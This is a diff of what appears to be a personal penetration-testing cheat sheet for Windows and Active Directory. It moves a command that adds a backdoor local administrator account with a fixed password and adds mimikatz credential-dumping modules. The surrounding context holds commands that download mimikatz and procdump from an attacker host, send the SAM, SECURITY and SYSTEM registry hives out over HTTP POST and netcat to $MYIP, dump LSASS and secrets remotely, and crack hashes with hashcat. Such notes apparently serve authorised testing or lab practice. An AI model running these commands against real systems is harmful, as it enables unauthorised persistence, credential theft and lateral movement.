@@ -1726,6 +1726,8 @@ cat computers | cut -d '$' -f1 > PRE2k
 nxc smb 192.168.110.51-56 -u computers -p PRE2k --no-bruteforce
 
 +---------- Dump Hashes ----------+
+powershell -c "net user dbf 123qweasdF! /add ; net localgroup Administrators dbf /add"
+nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --local-auth --sam --lsa --dpapi
 impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' -M lsassy
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --use-kcache --lsa --sam --dpapi --ntds --user Administrator
@@ -1769,6 +1771,9 @@ curl http://$MYIP:53/windows/procdump64.exe -o \programdata\procdump.exe; \progr
 curl http://$MYIP:53/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
+vault::cred
+lsadump::sam
+lsadump::secrets
 
 +---------- DnsAdmins ----------+
 rlwrap nc -lvnp 80
@@ -1826,11 +1831,8 @@ Windows 8.1             {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstal
 Windows 10 Enterprise   {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
 Windows 10 Pro          {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
 
-+---------- Dump Hashes (Local / Remote) ----------+
-net user dbf 123qweasdF! /add && net localgroup Administrators dbf /add
-
++---------- Dump Hashes (Local) ----------+
 cd c:\programdata; reg save hklm\sam sam; reg save hklm\security security; reg save hklm\system system
-
 iwr http://$MYIP:4444 -Method POST -InFile ".\sam"
 cmd /c "nc.exe $MYIP 4444 -w 3 < sam"
 nc -lvp 4444 > sam
@@ -1840,13 +1842,9 @@ nc -lvp 4444 > security
 iwr http://$MYIP:4444 -Method POST -InFile ".\system"
 cmd /c "nc.exe $MYIP 4444 -w 3 < system"
 nc -lvp 4444 > system
-
-nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --local-auth --sam --lsa --dpapi
-
 impacket-secretsdump -sam sam -system system -security security LOCAL
 echo 'Administrator:500:...................' > hashes
 hashcat -m 1000 -a 0 hashes $rockyou
-
 powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
 impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
 
